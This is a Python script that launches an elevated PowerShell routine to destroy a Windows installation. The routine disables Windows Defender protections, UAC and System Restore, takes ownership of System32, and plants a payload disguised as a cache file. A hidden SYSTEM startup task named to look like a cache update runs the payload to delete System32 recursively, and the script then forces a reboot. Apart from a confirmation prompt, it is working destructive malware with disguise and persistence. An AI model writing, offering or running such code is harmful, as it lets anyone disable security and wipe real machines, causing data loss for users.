import os
import subprocess

# PowerShell commands to disable security & delete System32
ps_script = """
# Disable Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue

# Disable UAC (User Account Control)
Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "EnableLUA" -Value 0 -ErrorAction SilentlyContinue

# Take ownership of System32
takeown /F C:\\Windows\\System32 /R /D Y | Out-Null
icacls C:\\Windows\\System32 /grant "$env:USERNAME:F" /T | Out-Null

# Disable System Restore
Disable-ComputerRestore -Drive "C:\\" -ErrorAction SilentlyContinue

# Create a payload to delete System32 after reboot
$payload = @'
Remove-Item -Path C:\\Windows\\System32 -Recurse -Force -ErrorAction SilentlyContinue
'@
$payload | Out-File "$env:TEMP\\SystemCache.dat" -Encoding ASCII

# Schedule task to run on startup
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\\SystemCache.dat`""
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "SystemCacheUpdate" -Action $action -Trigger $trigger -Principal $principal | Out-Null

# Force restart
Restart-Computer -Force
"""

# Execute PowerShell with admin privileges
def run_as_admin():
    try:
        # Escape quotes and newlines
        escaped_script = ps_script.replace('"', '`"').replace('\n', '; ')
        # Run elevated PowerShell
        subprocess.run(
            f'powershell -Command "Start-Process powershell -ArgumentList \'-ExecutionPolicy Bypass -Command \"{escaped_script}\"\' -Verb RunAs"',
            shell=True,
            check=True
        )
        print("[!] Script executed (requires admin approval).")
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Failed to execute: {e}")

if __name__ == "__main__":
    print("[WARNING] THIS SCRIPT WILL DESTROY YOUR WINDOWS INSTALLATION.")
    confirm = input("Are you SURE you want to proceed? (yes/no): ").strip().lower()
    if confirm == "yes":
        run_as_admin()
    else:
        print("Operation cancelled.")